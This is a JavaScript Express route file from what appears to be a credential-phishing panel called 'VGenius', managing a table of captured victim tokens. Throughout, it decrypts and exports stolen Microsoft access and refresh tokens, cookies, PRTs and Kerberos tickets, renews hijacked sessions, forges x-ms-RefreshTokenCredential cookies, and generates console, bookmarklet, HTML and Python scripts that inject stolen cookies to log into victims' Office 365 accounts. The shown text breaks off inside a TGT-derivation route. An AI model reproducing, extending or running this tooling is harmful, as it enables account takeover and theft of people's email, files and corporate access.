const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const kerberosService = require('../services/kerberos');
const silentConsentService = require('../services/silentconsent');

// Cache for column existence check
let hasTenantColumn = null;

async function checkTenantColumn() {
  if (hasTenantColumn !== null) return hasTenantColumn;
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'tenant'");
    hasTenantColumn = columns.length > 0;
  } catch (e) {
    hasTenantColumn = false;
  }
  return hasTenantColumn;
}

// ─── Skip /inject/* paths - these are handled by cookieinject.js ────
// This prevents /api/tokens/inject/* from being matched by tokenRoutes
router.get('/inject*', (req, res) => {
  // This catch-all ensures /api/tokens/inject/* paths return 404 from this router
  // and can be handled by the mounted cookieInjectRoutes at /api/tokens/inject
  res.status(404).json({ error: 'Not found - use /api/tokens/inject/* for cookie injection' });
});

// ─── Get all tokens for user ────────────────────────────────────────
router.get('/', userAuth, async (req, res) => {
   try {
     const { sort, search, page = 1, limit = 50 } = req.query;
     // Filter out expired/stale tokens for cleaner UI
     const whereClause = 'deleted = 0 AND expiration > NOW() AND stale = 0';

     // Check if tenant column exists
     const tenantExists = await checkTenantColumn();

     // Check if account_type column exists
     let accountTypeExists = false;
     try {
       const [acctCols] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
       accountTypeExists = acctCols.length > 0;
     } catch (e) { /* ignore */ }

     let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at${tenantExists ? ', tenant' : ''}, template_type${accountTypeExists ? ', account_type' : ''} FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
    const params = [req.user.id];

    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }

    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);

    const [t] = await db.query(query, params);
     let tokens = t;

     // Add defaults for missing columns
     if (!tenantExists && tokens.length > 0) {
       tokens = tokens.map(t => ({ ...t, tenant: 'common' }));
     }
     if (!accountTypeExists && tokens.length > 0) {
       tokens = tokens.map(t => ({ ...t, account_type: null }));
     }

    const [countResult] = await db.query(
      'SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    console.error('[Tokens] Get tokens error:', err.message);
    console.error('[Tokens] Stack:', err.stack);
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ─── Get single token with decrypted data ───────────────────────────
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      renewal_attempts: token.renewal_attempts,
      account_type: token.account_type || 'unknown',
      tenant: token.tenant,
      template_type: token.template_type,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted),
      prt: decrypt(token.prt),
      session_key_jwe: decrypt(token.session_key_jwe),
      device_tenant_id: token.device_tenant_id,
      tgt_ad: decrypt(token.tgt_ad),
      tgt_cloud: decrypt(token.tgt_cloud),
      kerberos_top_level_names: token.kerberos_top_level_names,
      tgt_cloud_sessionkey: decrypt(token.tgt_cloud_sessionkey)
    };

    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Update token notes ─────────────────────────────────────────────
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query(
      'UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?',
      [notes || '', req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Soft delete token ──────────────────────────────────────────────
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Generate cookie script ─────────────────────────────────────────
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    var cookies = decrypt(token.cookies_encrypted);

    if (!accessToken && !refreshToken && !cookies) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';
    var cookiesList = [];
    if (cookies) {
      // FIX: Pass tenant and account type for proper domain handling
      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
    }

    // FIX: If no cookies string exists but we have access/refresh tokens,
    // use the cookie converter to generate cookies from the tokens
    if (cookiesList.length === 0 && (accessToken || refreshToken)) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const tokenToUse = refreshToken || accessToken;
        const templateType = token.template_type || 'office';
        console.log('[Tokens] Converting token to cookies for script generation...');
        const conversionResult = await cookieConverter.convertTokensToCookies(
          tokenToUse, templateType, tenant, null, accountType
        );
        if (conversionResult.success && conversionResult.cookies) {
          cookies = conversionResult.cookies;
          cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
          console.log('[Tokens] Successfully converted token to cookies:', cookiesList.length, 'cookies');
        } else {
          console.warn('[Tokens] Token conversion failed:', conversionResult.error);
        }
      } catch (convertErr) {
        console.error('[Tokens] Cookie conversion error:', convertErr.message);
      }
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ 
        error: 'No cookies available',
        hint: accessToken 
          ? 'Token detected but conversion failed. Try "Refresh" to renew the session first.' 
          : 'No token data found for this entry.'
      });
    }

    var scripts = {};
    scripts.console = generatePopupScript(cookiesList);
    scripts.html = generateStandaloneHtml(cookiesList);
    scripts.python = generatePythonScript(cookiesList);
    scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, tenant);

    res.json({
      script: scripts.console,
      scripts: scripts,
      cookie_count: cookiesList.length,
      cookies: cookiesList,
      generated_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// ─── Parse cookie string into array of cookie objects ───────────────
// Enhanced: Supports tenant and account type for proper domain handling
function parseCookies(cookieString, options) {
  if (!cookieString) return [];

  options = options || {};
  var tenant = options.tenant || 'common';
  var accountType = options.accountType || 'unknown';

  // Build domain map for proper cookie domain assignment
  var domainMap = buildCookieDomainMap(tenant, accountType);

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes and their values
      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower === 'samesite' || nameLower === 'partitioned') {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Assign proper domain based on cookie name
      var assignedDomain = domainMap.getDomain(name);

      // Store unique cookies by lowercase name (last occurrence wins)
      seenNames[nameLower] = { name: name, value: value, domain: assignedDomain };
    }
  }

  // Convert object back to array
  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Build Cookie Domain Map ───────────────────────────────────────
function buildCookieDomainMap(tenant, accountType) {
  var domainMap = {
    _getDomain: function(cookieName) {
      var nameLower = cookieName.toLowerCase();

      // Personal account (MSA) domains
      if (accountType === 'personal') {
        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
          return '.login.live.com';
        }
        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
          return '.login.live.com';
        }
        return '.login.live.com';
      }

      // Work/School account domains
      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
          nameLower === 'es' || nameLower === 'pplms') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower.indexOf('x-ms') !== -1 || nameLower.indexOf('msauth') !== -1) {
        return '.login.microsoftonline.com';
      }
      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
          nameLower === 'MCLRC' || nameLower === 'wssbLocation') {
        return '.office.com';
      }
      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
          nameLower.indexOf('onedrive') !== -1) {
        return '.onedrive.live.com';
      }
      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
          nameLower.indexOf('outlook') !== -1) {
        return '.outlook.office365.com';
      }
      if (nameLower === 'SPOIDCRL' || nameLower === 'SPOExtensionSDK' ||
          nameLower.indexOf('sharepoint') !== -1) {
        return '.sharepoint.com';
      }
      if (nameLower === 'TEAMSSESSION' || nameLower.indexOf('teams') !== -1) {
        return '.teams.microsoft.com';
      }

      // Default fallback
      if (accountType === 'personal') return '.login.live.com';
      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
    },
    getDomain: function(cookieName) {
      return this._getDomain(cookieName);
    }
  };
  return domainMap;
}

// ─── PROPER METHOD: Opens popup to Microsoft login, injects cookies ─
function generatePopupScript(cookies) {
  if (!cookies || cookies.length === 0) return '';
  
  let output = '';
  for (var i = 0; i < cookies.length; i++) {
    const c = cookies[i];
    output += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
  }
  output += '\n';
  output += '// Redirect to Office.com after injecting cookies\n';
  output += 'setTimeout(() => {\n';
  output += '  window.location.href = "https://www.office.com/";\n';
  output += '}, 3000);\n';
  
  return output;
}

// ─── Standalone HTML injector page ──────────────────────────────────
function generateStandaloneHtml(cookies) {
  const cookieJson = JSON.stringify(cookies);
  // Use configurable TTL (default 30 days max for security)
  const expires = new Date();
  expires.setHours(expires.getHours() + config.COOKIE_MAX_TTL_HOURS);
  const expStr = expires.toUTCString();

  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += ' <meta charset="UTF-8">\n';
  html += ' <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
  html += ' <title>VGenius Cookie Injector</title>\n';
  html += ' <style>\n';
  html += ' body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
  html += ' button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
  html += ' button:hover { background: #00cca3; }\n';
  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
  html += ' .status { margin-top: 10px; padding: 10px; border-radius: 4px; }\n';
  html += ' .success { background: #0a3d0a; color: #0f0; }\n';
  html += ' .error { background: #3d0a0a; color: #f00; }\n';
  html += ' </style>\n';
  html += '</head>\n<body>\n';
  html += ' <h1>VGenius Cookie Session Injector</h1>\n';
  html += ' <p><strong>Step 1:</strong> Click the button below to open Microsoft login popup</p>\n';
  html += ' <p><strong>Step 2:</strong> Allow popups when prompted</p>\n';
  html += ' <p><strong>Step 3:</strong> Cookies are injected automatically after 2 seconds</p>\n';
  html += ' <button onclick="injectCookies()">Inject Cookies & Auto-Login</button>\n';
  html += ' <div id="status"></div>\n';
  html += ' <script>\n';

  // Build the actual injection function inline
  html += ' var cookies = ' + cookieJson + ';\n';
  html += ' var expStr = "' + expStr + '";\n';
  html += ' var statusDiv = document.getElementById("status");\n';
  html += '\n';
  html += ' function setStatus(msg, type) {\n';
  html += '   statusDiv.className = "status " + type;\n';
  html += '   statusDiv.innerHTML = msg;\n';
  html += ' }\n';
  html += '\n';
  html += ' function injectCookies() {\n';
  html += '   setStatus("Opening popup...", "success");\n';
  html += '\n';
  html += '   var popup = window.open(\n';
  html += '     "https://login.microsoftonline.com/common/oauth2/authorize",\n';
  html += '     "vgenius_inject",\n';
  html += '     "width=800,height=600,scrollbars=yes"\n';
  html += '   );\n';
  html += '\n';
  html += '   if (!popup) {\n';
  html += '     setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
  html += '     return;\n';
  html += '   }\n';
  html += '\n';
  html += '   // Wait 3 seconds for popup to load, then inject\n';
  html += '   setTimeout(function() {\n';
  html += '     try {\n';
  html += '       var popupDoc = popup.document;\n';
  html += '\n';
  html += '       // Set each cookie directly on the popup document\n';
  html += '       for (var i = 0; i < cookies.length; i++) {\n';
  html += '         var c = cookies[i];\n';
  html += '         var domain = c.domain || ".login.microsoftonline.com";\n';
  html += '         var cookieVal = encodeURIComponent(c.value);\n';
  html += '         var setCookie = c.name + "=" + cookieVal;\n';
  html += '         setCookie += "; domain=" + domain;\n';
  html += '         setCookie += "; path=/";\n';
  html += '         setCookie += "; SameSite=None";\n';
  html += '         setCookie += "; Secure";\n';
  html += '\n';
  html += '         popupDoc.cookie = setCookie;\n';
  html += '       }\n';
  html += '\n';
  html += '       // Verify cookies were set\n';
  html += '       setStatus("Injected ' + cookies.length + ' cookies! Redirecting...", "success");\n';
  html += '\n';
  html += '       // Now redirect to trigger authentication\n';
  html += '       popup.location.href = "https://www.office.com/";\n';
  html += '\n';
  html += '     } catch(e) {\n';
  html += '       setStatus("Error: " + e.message, "error");\n';
  html += '     }\n';
  html += '   }, 3000);\n';
  html += ' }\n';
  html += ' </script>\n';
  html += '</body></html>';

  return html;
}

// ─── Python requests script ─────────────────────────────────────────
function generatePythonScript(cookies) {
  var script = '#!/usr/bin/env python3\n';
  script += '# VGenius Cookie Session Injector - Python Version\n\n';
  script += 'import requests\n';
  script += 'from datetime import datetime\n\n';
  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
  script += 'session = requests.Session()\n\n';
  script += 'print("Injecting cookies...")\n';
  script += 'for cookie in cookies:\n';
  script += ' try:\n';
  script += ' session.cookies.set(\n';
  script += ' name=cookie["name"],\n';
  script += ' value=cookie["value"],\n';
  script += ' domain=cookie["domain"],\n';
  script += ' secure=True,\n';
  script += ' samesite="None"\n';
  script += ' )\n';
  script += ' print(f"Injected: {cookie[\'name\']}")\n';
  script += ' except Exception as e:\n';
  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
  script += 'print("\\nSession ready!")\n';
  script += 'print(f"Total cookies: {len(cookies)}")\n';
  script += 'print(f"Generated at: {datetime.now()}")\n';

  return script;
}

// ─── Bookmarklet-based injector (competitor's proven document.cookie method) ──
function generateInjectorScript(cookies, clientId, tenant) {
  var cookieJson = JSON.stringify(cookies);

  // Build bookmarklet code using document.cookie method
var bookmarklet = 'javascript:(function(){' + 
  'var cookies=' + cookieJson + ';' + 
  'cookies.forEach(function(c){' + 
  'var domain=c.domain||".login.microsoftonline.com";' + 
  'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
  '});' + 
  'setTimeout(function(){' + 
   'window.location.href="https://www.office.com/";' + 
  '},2000);' + 
  '})()';

  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Cookie Injector</title></head><body>\n';
  script += '<h1 style="color:#00ccff">Cookie Injection Ready</h1>\n';
  script += '<p>Drag the button below to your bookmarks bar, then click it on the Microsoft login page.</p>\n';
  script += '<div id="bookmarklet"></div>\n';
  script += '<div id="status">Instructions will appear here.</div>\n';
  script += '<script>\n';
  script += 'var bookmarklet = "' + bookmarklet.replace(/"/g, '\\"') + '";\n';
  script += 'var div = document.getElementById("bookmarklet");\n';
  script += 'div.innerHTML = \'<a href="\' + bookmarklet + \'" style="display:inline-block;padding:15px 30px;background:#00ccff;color:#000;text-decoration:none;border-radius:6px;font-weight:bold;">Inject Cookies</a>\';\n';
  script += '</script>\n';
  script += '</body></html>';

  return script;
}

// ─── Manual cookie renewal ──────────────────────────────────────────
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for renewal' });
    }

    // Use refresh token for direct renewal (no popup needed)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
        const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';

        // Use stored client_id if available, otherwise fall back to env
        const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
        const result = await cookieConverter.convertTokensToCookies(
          refreshToken, templateType, tokenTenant, null, token.account_type || 'unknown'
        );

        if (result.success && result.cookies) {
          const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
          const newAccessToken = result.access_token || accessToken;
          const newRefreshToken = result.new_refresh_token || refreshToken;

          await db.query(
            `UPDATE captured_tokens
             SET cookies_encrypted = ?, token_type = 'cookie',
                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
                 last_renewed = NOW(),
                 renewal_count = COALESCE(renewal_count, 0) + 1,
                 access_token_encrypted = ?, refresh_token_encrypted = ?
             WHERE id = ?`,
            [
              encrypt(result.cookies),
              ttlHours,
              encrypt(newAccessToken),
              encrypt(newRefreshToken),
              token.id
            ]
          );

          await db.query(
            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
          );

        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = result.cookies ? (result.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully using refresh token',
          cookies: result.cookies,
          cookie_count: cookieCount
        });
        }
      } catch (refreshErr) {
        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
      }
    }

    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
    if (!token.link_id || token.token_type === 'cookie') {
      // Use the cookie converter as fallback
      const cookieConverter = require('../services/cookieconverter');
      const cookieResult = await cookieConverter.convertTokensToCookies(
        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.account_type || 'unknown'
      );

      if (cookieResult.success && cookieResult.cookies) {
        const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
        await db.query(
          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
          [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
        );
        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = cookieResult.cookies ? (cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully',
          cookies: cookieResult.cookies,
          cookie_count: cookieCount
        });
      }
      return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
    }

    // Try device code flow only if we have a valid link_id
    const deviceProxy = require('../services/deviceproxy');
    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const jwtToken = require('jsonwebtoken').sign(
      { user_id: req.user.id, link_id: token.link_id },
      require('../config/env').JWT_SECRET,
      { expiresIn: '1h' }
    );

    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);

    if (result.user_code) {
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
        [token.id, req.user.id, result.user_code]
      );

      res.json({
        success: true,
        job_id: result.job_id,
        user_code: result.user_code,
        verification_uri: result.verification_uri,
        message: 'Renewal initiated. Complete authentication in the popup.',
        instructions: 'A popup will open. Enter the code and complete the Microsoft login.'
      });
    } else {
      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
    }
  } catch (err) {
    const errorMsg = err.message || err.toString() || 'Unknown error';
    console.error('[Tokens] Renewal error:', errorMsg);
    res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
  }
});

// ─── Get renewal history ────────────────────────────────────────────
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── One-shot console script for direct cookie injection ─────────────
router.get('/inject-script', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for injection' });
    }

    // FIX: Pass tenant and account type for proper domain handling
    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';

    // Get cookies from token - require actual cookies only (no fallback)
    var cookiesList = [];
    var cookiesDecrypted = decrypt(token.cookies_encrypted);
    if (cookiesDecrypted) {
      cookiesList = parseCookies(cookiesDecrypted, { tenant: tenant, accountType: accountType });
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available for injection' });
    }

    // Build cookie injection statements with proper domains
    var cookieStatements = '';
    for (var i = 0; i < cookiesList.length; i++) {
      var c = cookiesList[i];
      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=' + (c.domain || '.login.microsoftonline.com') + '; path=/; Secure; SameSite=None";\n';
    }

    const script = '(function() {\n' +
      cookieStatements + '\n' +
      '// Redirect to Office.com after injecting cookies\n' +
      'setTimeout(function() {\n' +
      'window.location.href = "https://www.office.com/";\n' +
      '}, 3000);\n' +
      '})();';

    res.type('application/javascript').send(script);
  } catch (err) {
    console.error('[Tokens] Inject script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// ─── PRT-only cookie injection script (exact competitor format) ──────
router.get('/prt-inject', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const idToken = decrypt(token.id_token_encrypted);

    if (!refreshToken) {
      return res.status(400).json({ error: 'No refresh token available' });
    }

    // Extract tid and uid for PRT construction
    let tid = token.tenant || 'common';
    let uid = '';

    // Try to get uid from session_key_jwe or client_info
    const sessionKeyJwe = decrypt(token.session_key_jwe);
    if (sessionKeyJwe) {
      try {
        const parsed = JSON.parse(sessionKeyJwe);
        if (parsed.client_info) {
          const decoded = Buffer.from(parsed.client_info, 'base64').toString();
          const info = JSON.parse(decoded);
          uid = info.uid || '';
        }
      } catch (e) { /* ignore */ }
    }

    // Try to get tid from id_token
    if (idToken) {
      try {
        const payload = idToken.split('.')[1];
        let padded = payload;
        while (padded.length % 4) padded += '=';
        const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
        tid = decoded.tid || tid;
      } catch (e) { /* ignore */ }
    }

    // Generate PRT cookie using cookie converter
    const cookieConverter = require('../services/cookieconverter');
    const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
      refreshToken,
      token.account_type || 'work_school',
      { tid: tid, uid: uid, scopes: 'openid profile email offline_access User.Read' }
    );

    if (!prtCookieObj || !prtCookieObj.value) {
      return res.status(400).json({ error: 'Failed to generate PRT cookie' });
    }

    // Generate exact competitor format script
    const script = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";
// Redirect after 3s
setTimeout(() => {
  window.location.href = "https://login.microsoftonline.com/?auth=2";
}, 3000);`;

    res.type('application/javascript').send(script);
  } catch (err) {
    console.error('[Tokens] PRT inject error:', err);
    res.status(500).json({ error: 'Failed to generate PRT injection script' });
  }
});

// ─── Manual cookie conversion from pasted access token ──────────────
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type, tenant, account_type, refresh_token } = req.body;

    if (!access_token && !refresh_token) {
      return res.status(400).json({ error: 'Access token or refresh token is required' });
    }

    const tokenToUse = access_token || refresh_token;
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(
      tokenToUse,
      template_type || 'office',
      tenant || 'common',
      null,
      account_type || 'unknown'
    );

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '30 days',
        instructions: 'Use the injector page to set cookies in your browser'
      });
    } else {
      console.error('[Tokens] Convert-cookie error:', result.error);
      res.status(400).json({ 
        success: false, 
        error: result.error || 'Conversion failed',
        debug: result.debug
      });
    }
  } catch (err) {
    console.error('[Tokens] Conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Export tokens ──────────────────────────────────────────────────
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted),
      prt: decrypt(token.prt),
      session_key_jwe: decrypt(token.session_key_jwe),
      account_type: token.account_type || 'unknown'
    }));

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Export and delete all ──────────────────────────────────────────
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));

    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: true
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Derive Kerberos TGTs for a specific token ──────────────────────
router.post('/:id/derive-tgt', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
